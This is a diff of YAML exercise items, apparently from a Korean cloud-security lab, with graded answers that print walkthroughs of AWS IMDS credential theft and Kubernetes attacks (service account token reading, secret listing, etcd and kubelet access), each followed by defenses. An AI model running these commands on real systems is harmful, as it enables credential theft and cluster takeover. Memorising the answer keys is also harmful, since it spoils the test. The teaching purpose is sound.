@@ -32,11 +32,11 @@ steps:
   hint: 169.254.169.254에서 IAM 역할의 임시 자격증명을 요청하는 과정을 문서화한다
   category: exploit
   points: 10
-  answer: 'echo -e ''=== IMDS Metadata Attack ===\n\n[Step 1: Discover Role]\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/\n-> Returns: my-ec2-role\n\n[Step 2: Get Credentials]\ncurl
-    http://169.254.169.254/latest/meta-data/iam/security-credentials/my-ec2-role\n-> Returns:\n{\n  "AccessKeyId": "ASIA...",\n  "SecretAccessKey": "xxx...",\n  "Token": "FwoGZX...",\n  "Expiration": "2026-04-04T12:00:00Z"\n}\n\n[Step
-    3: Use Credentials]\nexport AWS_ACCESS_KEY_ID=ASIA...\nexport AWS_SECRET_ACCESS_KEY=xxx...\nexport AWS_SESSION_TOKEN=FwoGZX...\naws s3 ls  # Access S3 as the EC2 role\n\n[IMDSv2 Defense]\nTOKEN=$(curl
-    -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")\ncurl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/...\n# Requires PUT + custom
-    header -> SSRF cannot forge this'''
+  answer: "echo -e '=== IMDS Metadata Attack ===\\n\\n[Step 1: Discover Role]\\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/\\n-> Returns: my-ec2-role\\n\\n[Step 2: Get Credentials]\\\
+    ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/my-ec2-role\\n-> Returns:\\n{\\n  \"AccessKeyId\": \"ASIA...\",\\n  \"SecretAccessKey\": \"xxx...\",\\n  \"Token\": \"FwoGZX...\"\
+    ,\\n  \"Expiration\": \"2026-04-04T12:00:00Z\"\\n}\\n\\n[Step 3: Use Credentials]\\nexport AWS_ACCESS_KEY_ID=ASIA...\\nexport AWS_SECRET_ACCESS_KEY=xxx...\\nexport AWS_SESSION_TOKEN=FwoGZX...\\naws\
+    \ s3 ls  # Access S3 as the EC2 role\\n\\n[IMDSv2 Defense]\\nTOKEN=$(curl \\\n     -X PUT http://169.254.169.254/latest/api/token \\\n     -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\")\\ncurl\
+    \ \\\n     -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/...\\n# Requires PUT + custom header -> SSRF cannot forge this'"
   answer_detail: AWS IMDSv1은 단순 GET 요청으로 IAM 역할의 임시 자격증명을 반환하므로 SSRF에 취약하다. Capital One 해킹(2019)이 이 기법으로 1억 건의 고객 정보를 유출했다. IMDSv2는 PUT 요청으로 토큰을 먼저 획득해야 하므로 SSRF로 악용이 어렵다. 모든 EC2에서 IMDSv2를 강제해야 한다.
   verify:
     type: output_contains
@@ -114,11 +114,11 @@ steps:
   hint: kubectl, 서비스 어카운트 토큰, etcd API를 통한 클러스터 장악을 다룬다
   category: exploit
   points: 10
-  answer: 'echo -e ''=== Kubernetes Attack Vectors ===\n\n[1] Pod Escape\n- Privileged container: nsenter to host\n- hostPID/hostNetwork: Access host resources\n- Mount /var/run/docker.sock: Container breakout\n\n[2]
-    Service Account Token\ncat /var/run/secrets/kubernetes.io/serviceaccount/token\nkubectl --token=\$TOKEN get secrets --all-namespaces\n\n[3] etcd Direct Access\ncurl https://etcd:2379/v3/kv/range -d
-    \''{}\'' --cert ...\n-> Contains all cluster secrets in plaintext\n\n[4] Kubelet API\ncurl -sk https://node:10250/pods\ncurl -sk https://node:10250/run/namespace/pod/container -d "cmd=id"\n\n[5] Cloud
-    Provider Escalation\ncurl http://169.254.169.254/latest/meta-data/\n-> EC2 instance role from within Pod\n\n[Defense]\n- Pod Security Standards (restricted)\n- RBAC with least privilege\n- Network policies
-    for pod isolation\n- etcd encryption at rest\n- OPA/Gatekeeper admission control'''
+  answer: "echo -e '=== Kubernetes Attack Vectors ===\\n\\n[1] Pod Escape\\n- Privileged container: nsenter to host\\n- hostPID/hostNetwork: Access host resources\\n- Mount /var/run/docker.sock: Container\
+    \ breakout\\n\\n[2] Service Account Token\\ncat /var/run/secrets/kubernetes.io/serviceaccount/token\\nkubectl --token=\\$TOKEN get secrets --all-namespaces\\n\\n[3] etcd Direct Access\\ncurl https://etcd:2379/v3/kv/range\
+    \ \\\n     -d \\'{}\\' --cert ...\\n-> Contains all cluster secrets in plaintext\\n\\n[4] Kubelet API\\ncurl -sk https://node:10250/pods\\ncurl -sk https://node:10250/run/namespace/pod/container \\\n\
+    \     -d \"cmd=id\"\\n\\n[5] Cloud Provider Escalation\\ncurl http://169.254.169.254/latest/meta-data/\\n-> EC2 instance role from within Pod\\n\\n[Defense]\\n- Pod Security Standards (restricted)\\\
+    n- RBAC with least privilege\\n- Network policies for pod isolation\\n- etcd encryption at rest\\n- OPA/Gatekeeper admission control'"
   answer_detail: Kubernetes는 컨테이너 오케스트레이션의 복잡성으로 인해 다양한 공격 경로를 제공한다. 특권 Pod에서 호스트로 탈출하고, Service Account 토큰으로 클러스터 API에 접근하며, etcd에서 모든 시크릿을 읽을 수 있다. Pod Security Standards, RBAC, Network Policy의 3중 방어가
     필수적이다.
   verify:
